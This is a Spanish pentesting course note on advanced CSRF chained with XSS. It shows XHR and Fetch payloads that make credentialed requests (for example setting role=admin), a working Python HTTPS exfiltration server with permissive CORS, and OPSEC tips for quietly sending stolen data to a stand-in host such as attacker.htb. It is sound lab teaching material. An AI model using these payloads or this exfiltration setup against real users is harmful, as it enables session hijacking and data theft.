---
tags:
  - Web/Red-Team
  - Pentesting
  - Pentesting/Explotacion
  - CSRF
Fecha de actualización: 2026-06-08
Nota previa:
Nota siguiente: "[[01 - Fundamentos y defensas de CSRF]]"
Area: "[[CSRF.base|CSRF]]"
---
---

Los navegadores modernos han desactivado el `CSRF` clásico. Tres mecanismos —la [[02 - Same-Origin Policy y CORS|Same-Origin Policy]], `CORS` y las cookies `SameSite`— bloquean por defecto la mayoría de ataques CSRF "de libro". <mark style="background: #FFB8EBA6;">Hoy un CSRF plano que cambie estado es cada vez más raro de explotar</mark>. Pero eso no cierra el capítulo: <mark style="background: #FFB86CA6;">cuando existe un `XSS`, combinarlo con CSRF convierte un fallo de cliente en un pivote hacia la aplicación vulnerable y hacia la red interna de la víctima</mark>. Este sub-tema desarrolla esa explotación avanzada. Empezamos por las dos primitivas que la sostienen y el entorno donde se construye el exploit.

# Las primitivas: `XMLHttpRequest` y `Fetch`

Toda la explotación de CSRF y XSS avanzado se reduce a lo mismo: <mark style="background: #ADCCFFA6;">hacer peticiones HTTP desde JavaScript en el navegador de la víctima y leer o exfiltrar sus respuestas</mark>. Hay dos APIs para ello.

`XMLHttpRequest` (XHR), la clásica, controla método, cabeceras y cuerpo:

```js
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.htb/profile', false);  // false = síncrono
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;                              // adjunta cookies
xhr.send('user=attacker&role=admin');
```

`Fetch`, la moderna, hace lo mismo con una interfaz basada en promesas:

```js
await fetch('https://target.htb/profile', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    credentials: 'include',                              // adjunta cookies
    body: 'user=attacker&role=admin'
});
```

Dos detalles que vas a usar en cada payload:

- <mark style="background: #FF5582A6;">`withCredentials = true` (XHR) o `credentials: 'include'` (Fetch) adjunta las cookies de sesión de la víctima a la petición cross-origin</mark>. Sin ellos, la petición viaja **sin** sesión y no actúa en nombre de la víctima. Es el interruptor que diferencia una petición anónima de una autenticada.
- El tercer parámetro `false` de `xhr.open` hace la petición **síncrona**. Es incómodo de leer pero práctico cuando hay que encadenar pasos dependientes —leer un token `CSRF` y luego enviarlo en la misma ejecución— sin enredarse con callbacks ni `await`. El XHR síncrono está deprecado en el hilo principal (algunos navegadores emiten warning); se usa aquí por concisión didáctica, pero un `await fetch` es más robusto para payloads que deban perdurar.

> [!warning]+ Adjuntar la cookie no garantiza poder leer la respuesta
> `credentials: 'include'` hace que la cookie viaje, pero la [[02 - Same-Origin Policy y CORS|Same-Origin Policy]] puede impedirte **leer** la respuesta si el destino es otro origen y no hay `CORS` que lo permita. Enviar y leer son dos permisos distintos: un CSRF clásico solo necesita enviar; exfiltrar datos cross-origin necesita además leer.

# El entorno de desarrollo del exploit

En los labs de este módulo (y en un engagement real) conviene separar tres piezas:

- **Servidor de desarrollo del exploit** (`https://exploitserver.htb`): aloja el payload. El endpoint `/exploit` sirve el código y `/deliver` fuerza a la víctima simulada a visitarlo. <mark style="background: #FFB8EBA6;">El módulo se centra en **desarrollar** el exploit, no en entregarlo</mark>; en el mundo real la entrega es otro problema (un enlace por correo, mensajería, un comentario con el payload).
- **Aplicación vulnerable** (`https://vulnerablesite.htb`): el objetivo que evaluamos.
- **Servidor de exfiltración**: una máquina nuestra que recibe los datos robados.

<mark style="background: #FFB86CA6;">Todo corre sobre HTTPS por una razón técnica, no cosmética</mark>: los navegadores bloquean *mixed content* —una página HTTPS no puede cargar recursos por HTTP sin cifrar—, y las cookies `SameSite=None` exigen el atributo `Secure`, que solo se envía por HTTPS. Si tu servidor de exfiltración fuera HTTP plano, muchos payloads fallarían en silencio.

## Servidor de exfiltración HTTPS

Basta un servidor mínimo en Python que registre las peticiones entrantes. La clave es responder a las peticiones `OPTIONS` (preflight) con cabeceras `CORS` permisivas, para que los `POST` cross-origin de nuestros payloads no los frene el propio navegador de la víctima:

```python
from http import server
import ssl

class CustomRequestHandler(server.SimpleHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        if body:
            self.log_message("[i] POST body: %s", body.decode("utf-8", errors="replace"))
        self.send_response(200)
        self.end_headers()

httpd = server.HTTPServer(('0.0.0.0', 4443), CustomRequestHandler)
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile='./server.pem')   # openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
```

> [!warning]+ El certificado autofirmado no vale en producción
> En el lab la validación de certificados está desactivada, pero en un engagement real el navegador de la víctima **rechazará** un certificado autofirmado y no cargará tus recursos. Usa un certificado válido (Let's Encrypt sobre un dominio tuyo) o un colaborador con TLS válido como `Interactsh` o el Burp Collaborator. Para más sobre TLS, ver el módulo `HTTPS/TLS Attacks`.

## OPSEC de la exfiltración

Cómo exfiltras importa tanto como qué exfiltras:

- <mark style="background: #8000E1A6;">Exfiltrar en segundo plano con `fetch`/`XMLHttpRequest` es mucho más discreto que `location = 'https://attacker.htb/?d=' + data`</mark>: manipular `location` provoca una redirección visible y la víctima ve cómo cambia la página en su navegador, delatando el ataque.
- Para datos grandes, un `POST` evita el límite de longitud de la URL que tendría un `GET` con la información en la query string.
- Codifica lo exfiltrado en `base64` (`btoa(...)`) para que caracteres especiales del HTML robado no rompan tu petición ni los logs del servidor.

Con las primitivas y el entorno listos, repasamos qué es exactamente el CSRF y qué defensas tendremos que sortear: [[01 - Fundamentos y defensas de CSRF]].
